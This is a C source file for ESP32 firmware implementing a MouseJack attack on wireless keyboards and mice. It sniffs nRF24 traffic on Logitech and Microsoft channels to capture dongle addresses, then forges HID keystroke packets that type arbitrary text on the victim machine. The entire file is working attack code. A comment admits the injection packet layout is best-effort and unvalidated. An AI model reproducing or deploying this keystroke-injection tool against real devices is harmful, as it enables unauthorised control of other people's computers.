/*
 * SPDX-FileCopyrightText: 2026 Black Crow Official Community Dxt and contributors
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

#include "nrf24_mousejack.h"
#include "nrf24_driver.h"

#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_rom_sys.h"
#include "io.h"

static const char *TAG = "nrf_mj";

/* ============================================================
 * FIX C2: helper yield untuk scan loop.
 * ============================================================ */
static inline void mj_yield(void)
{
    vTaskDelay(1);
}

/* ============================================================
 * FIX M1: saved radio state untuk restore setelah inject.
 * ============================================================ */
typedef struct {
    uint8_t config;
    uint8_t en_aa;
    uint8_t rf_setup;
    uint8_t setup_aw;
    bool    valid;
} mj_saved_state_t;

static mj_saved_state_t s_saved;

static const uint8_t LOGITECH_CHANNELS[] = {
    2, 5, 8, 11, 14, 17, 20, 23, 26, 29, 32, 35, 38, 41, 44, 47,
    50, 53, 56, 59, 62, 65, 68, 71, 74, 77, 80
};
#define LOGITECH_CH_N (sizeof(LOGITECH_CHANNELS) / sizeof(LOGITECH_CHANNELS[0]))

static const uint8_t MICROSOFT_CHANNELS[] = {
    1, 4, 7, 10, 13, 16, 19, 22, 25, 28, 31, 34, 37, 40, 43, 46,
    49, 52, 55, 58, 61, 64, 67, 70, 73, 76, 79
};
#define MICROSOFT_CH_N (sizeof(MICROSOFT_CHANNELS) / sizeof(MICROSOFT_CHANNELS[0]))

#define LOGITECH_ADDR_PREFIX  0x01

static SemaphoreHandle_t s_lock = NULL;
static TaskHandle_t      s_task = NULL;
static volatile bool     s_running = false;
static volatile bool     s_stop_requested = false;

static mousejack_target_t s_targets[MOUSEJACK_MAX_TARGETS];
static uint32_t s_count = 0;
static uint32_t s_duration_s = 0;
static int64_t  s_started_us = 0;

esp_err_t nrf24_mousejack_init(void)
{
    s_lock = xSemaphoreCreateMutex();
    if (!s_lock) {
        ESP_LOGE(TAG, "mutex alloc failed");
        return ESP_ERR_NO_MEM;
    }
    s_count = 0;
    ESP_LOGI(TAG, "mousejack init OK");
    return ESP_OK;
}

static bool target_exists(const uint8_t *addr)
{
    for (uint32_t i = 0; i < s_count; i++) {
        if (memcmp(s_targets[i].address, addr, MOUSEJACK_ADDR_LEN) == 0)
            return true;
    }
    return false;
}

static void scan_task(void *arg)
{
    (void)arg;
    s_started_us = esp_timer_get_time();

    /* Radio sudah di-claim oleh nrf24_mousejack_scan_start() */

    io_log("nrf_mj: scan START dur=%us\r\n", (unsigned)s_duration_s);

    nrf24_enter_promiscuous();

    uint32_t ch_idx = 0;
    uint32_t total_ch = LOGITECH_CH_N + MICROSOFT_CH_N;
    uint32_t last_stat = 0;
    uint8_t buf[32];

    while (!s_stop_requested) {
        if (s_duration_s > 0) {
            uint32_t elapsed = (uint32_t)((esp_timer_get_time() - s_started_us) / 1000000);
            if (elapsed >= s_duration_s) break;
        }

        uint8_t ch;
        if (ch_idx < LOGITECH_CH_N) ch = LOGITECH_CHANNELS[ch_idx];
        else                        ch = MICROSOFT_CHANNELS[ch_idx - LOGITECH_CH_N];
        ch_idx = (ch_idx + 1) % total_ch;

        nrf24_set_channel(ch);
        esp_rom_delay_us(100);

        if (!nrf24_rx_available()) {
            mj_yield();   /* FIX C2: yield supaya idle task jalan */
            continue;
        }

        int len = nrf24_rx(buf, sizeof(buf));
        /* FIX L1: promiscuous selalu return 32 byte, jadi len >= 6 selalu true.
         * Cek minimal 2 byte untuk ekstrak address. */
        if (len < 2) {
            mj_yield();
            continue;
        }

        bool is_logitech = (buf[0] == LOGITECH_ADDR_PREFIX);
        bool is_microsoft = (len >= 6 && !is_logitech);

        /* FIX L2: capture 5 byte penuh (bukan hanya 2) supaya inject bisa
         * pakai alamat lengkap yang cocok dengan dongle Logitech asli. */
        uint8_t addr[MOUSEJACK_ADDR_LEN];
        memset(addr, 0, sizeof(addr));
        if (len >= MOUSEJACK_ADDR_LEN) {
            memcpy(addr, buf, MOUSEJACK_ADDR_LEN);
        } else {
            memcpy(addr, buf, (size_t)len);
        }

        if (s_lock) xSemaphoreTake(s_lock, portMAX_DELAY);
        if (!target_exists(addr) && s_count < MOUSEJACK_MAX_TARGETS) {
            mousejack_target_t *t = &s_targets[s_count];
            memcpy(t->address, addr, MOUSEJACK_ADDR_LEN);
            t->channel = ch;
            t->hits = 1;
            t->is_logitech = is_logitech;
            t->is_microsoft = is_microsoft;
            s_count++;

            io_log("nrf_mj: TARGET idx=%u addr=%02X:%02X:%02X:%02X:%02X ch=%u %s\r\n",
                   (unsigned)(s_count - 1),
                   addr[0], addr[1], addr[2], addr[3], addr[4],
                   (unsigned)ch,
                   is_logitech ? "logitech" : "unknown");
        } else {
            for (uint32_t i = 0; i < s_count; i++) {
                if (memcmp(s_targets[i].address, addr, MOUSEJACK_ADDR_LEN) == 0) {
                    s_targets[i].hits++;
                    break;
                }
            }
        }
        if (s_lock) xSemaphoreGive(s_lock);

        uint32_t sec = (uint32_t)((esp_timer_get_time() - s_started_us) / 1000000);
        if (sec - last_stat >= 5) {
            last_stat = sec;
            io_log("nrf_mj: STAT %us found=%u\r\n",
                   (unsigned)sec, (unsigned)s_count);
        }

        /* FIX: yield periodik untuk cegah WDT di bawah noise RF */
        mj_yield();
    }

    nrf24_exit_promiscuous();

    io_log("nrf_mj: scan STOPPED targets=%u\r\n", (unsigned)s_count);

    nrf24_radio_release();

    s_running = false;
    s_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t nrf24_mousejack_scan_start(uint32_t duration_s)
{
    if (!nrf24_is_present()) return ESP_ERR_INVALID_STATE;
    if (s_running) return ESP_ERR_INVALID_STATE;
    if (duration_s > 600) duration_s = 600;
    if (duration_s < 5) duration_s = 30;

    /* FIX H1: claim atomic */
    if (!nrf24_radio_claim("mousejack")) {
        io_log("nrf_mj: radio busy\r\n");
        return ESP_ERR_INVALID_STATE;
    }

    s_duration_s = duration_s;
    s_stop_requested = false;
    s_running = true;

    BaseType_t ok = xTaskCreate(scan_task, "nrf_mj", 6144, NULL, 3, &s_task);
    if (ok != pdPASS) {
        s_running = false;
        s_task = NULL;
        nrf24_radio_release();
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

esp_err_t nrf24_mousejack_scan_stop(void)
{
    if (!s_running) return ESP_ERR_INVALID_STATE;
    s_stop_requested = true;
    for (int i = 0; i < 100 && s_task != NULL; i++) vTaskDelay(pdMS_TO_TICKS(20));
    return ESP_OK;
}

bool nrf24_mousejack_scan_is_running(void) { return s_running; }

void nrf24_mousejack_dump(void)
{
    if (!s_lock) return;
    xSemaphoreTake(s_lock, portMAX_DELAY);

    io_log("nrf_mj: LS count=%u\r\n", (unsigned)s_count);
    for (uint32_t i = 0; i < s_count; i++) {
        const mousejack_target_t *t = &s_targets[i];
        io_log("nrf_mj: LS idx=%u addr=%02X:%02X:%02X:%02X:%02X ch=%u hits=%u type=%s\r\n",
               (unsigned)i,
               t->address[0], t->address[1], t->address[2],
               t->address[3], t->address[4],
               (unsigned)t->channel, (unsigned)t->hits,
               t->is_logitech ? "logitech" : "unknown");
    }
    io_log("nrf_mj: LS end\r\n");
    xSemaphoreGive(s_lock);
}

uint32_t nrf24_mousejack_count(void)
{
    if (!s_lock) return 0;
    uint32_t n = 0;
    xSemaphoreTake(s_lock, portMAX_DELAY);
    n = s_count;
    xSemaphoreGive(s_lock);
    return n;
}

void nrf24_mousejack_clear(void)
{
    if (!s_lock) return;
    xSemaphoreTake(s_lock, portMAX_DELAY);
    s_count = 0;
    xSemaphoreGive(s_lock);
    io_log("nrf_mj: cleared\r\n");
}

esp_err_t nrf24_mousejack_inject(uint32_t target_idx, const char *text)
{
    if (!nrf24_is_present() || !text) return ESP_ERR_INVALID_ARG;
    if (!s_lock) return ESP_ERR_INVALID_STATE;

    /* FIX H1: claim atomic */
    if (!nrf24_radio_claim("mj_inject")) {
        io_log("nrf_mj: radio busy\r\n");
        return ESP_ERR_INVALID_STATE;
    }

    mousejack_target_t tgt;
    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (target_idx >= s_count) {
        xSemaphoreGive(s_lock);
        nrf24_radio_release();
        return ESP_ERR_INVALID_ARG;
    }
    memcpy(&tgt, &s_targets[target_idx], sizeof(tgt));
    xSemaphoreGive(s_lock);

    io_log("nrf_mj: inject target=%u text=\"%s\"\r\n",
           (unsigned)target_idx, text);

    /* FIX M1: save state sebelum modifikasi */
    s_saved.config   = nrf24_read_reg(NRF24_REG_CONFIG);
    s_saved.en_aa    = nrf24_read_reg(NRF24_REG_EN_AA);
    s_saved.rf_setup = nrf24_read_reg(NRF24_REG_RF_SETUP);
    s_saved.setup_aw = nrf24_read_reg(NRF24_REG_SETUP_AW);
    s_saved.valid    = true;

    nrf24_set_channel(tgt.channel);
    nrf24_set_addr_width(NRF24_AW_5);

    /* FIX L2: gunakan 5 byte address full dari scan */
    uint8_t tx_addr[5];
    memcpy(tx_addr, tgt.address, MOUSEJACK_ADDR_LEN);
    nrf24_set_tx_address(tx_addr, 5);

    nrf24_enable_auto_ack(0, false);
    nrf24_enable_crc(false, false);
    nrf24_set_data_rate(NRF24_RATE_2M);

    if (nrf24_is_rx_mode()) nrf24_enter_tx();

    size_t text_len = strlen(text);
    int injected = 0;

    for (size_t i = 0; i < text_len; i++) {
        char c = text[i];
        uint8_t keycode = 0;
        uint8_t modifier = 0;

        if (c >= 'a' && c <= 'z')         keycode = 0x04 + (c - 'a');
        else if (c >= 'A' && c <= 'Z')    { keycode = 0x04 + (c - 'A'); modifier = 0x02; }
        else if (c >= '1' && c <= '9')    keycode = 0x1E + (c - '1');
        else if (c == '0')                keycode = 0x27;
        else if (c == ' ')                keycode = 0x2C;
        else if (c == '\n')               keycode = 0x28;
        else if (c == '.')                keycode = 0x37;
        else if (c == ',')                keycode = 0x36;
        else if (c == '/')                keycode = 0x38;
        else if (c == '-')                keycode = 0x2D;
        else if (c == '_')                { keycode = 0x2D; modifier = 0x02; }
        else                              continue;

        uint8_t pkt[14];
        /* FIX L2: 5 byte address dari scan, bukan hanya 2.
         * CATATAN: pada protokol Logitech kanonik alamat ada di TX_ADDR,
         * bukan di payload — layout ini best-effort, perlu validasi HW. */
        pkt[0]  = tgt.address[0];
        pkt[1]  = tgt.address[1];
        pkt[2]  = tgt.address[2];
        pkt[3]  = tgt.address[3];
        pkt[4]  = tgt.address[4];
        /* HID report setelah address */
        pkt[5]  = 0x51;   /* Keep-alive + frame type */
        pkt[6]  = 0x1A;   /* Frame subtype (keyboard) */
        pkt[7]  = modifier;
        pkt[8]  = 0x00;
        pkt[9]  = keycode;
        pkt[10] = 0x00;
        pkt[11] = 0x00;

        uint8_t xor_crc = 0;
        for (int k = 0; k < 12; k++) xor_crc ^= pkt[k];
        pkt[12] = xor_crc;
        pkt[13] = 0x00;

        nrf24_tx_wait(pkt, 14, 1000);
        vTaskDelay(pdMS_TO_TICKS(12));

        /* Release key */
        pkt[7] = 0x00;
        pkt[9] = 0x00;
        xor_crc = 0;
        for (int k = 0; k < 12; k++) xor_crc ^= pkt[k];
        pkt[12] = xor_crc;

        nrf24_tx_wait(pkt, 14, 1000);
        vTaskDelay(pdMS_TO_TICKS(12));

        injected++;
        if (s_stop_requested) break;
    }

    io_log("nrf_mj: inject done (%d/%u chars)\r\n",
           injected, (unsigned)text_len);

    /* FIX M1: restore state radio */
    if (s_saved.valid) {
        nrf24_write_reg(NRF24_REG_CONFIG,    s_saved.config);
        nrf24_write_reg(NRF24_REG_EN_AA,     s_saved.en_aa);
        nrf24_write_reg(NRF24_REG_RF_SETUP,  s_saved.rf_setup);
        nrf24_write_reg(NRF24_REG_SETUP_AW,  s_saved.setup_aw);
        s_saved.valid = false;
    }

    nrf24_standby();
    nrf24_radio_release();
    return ESP_OK;
}
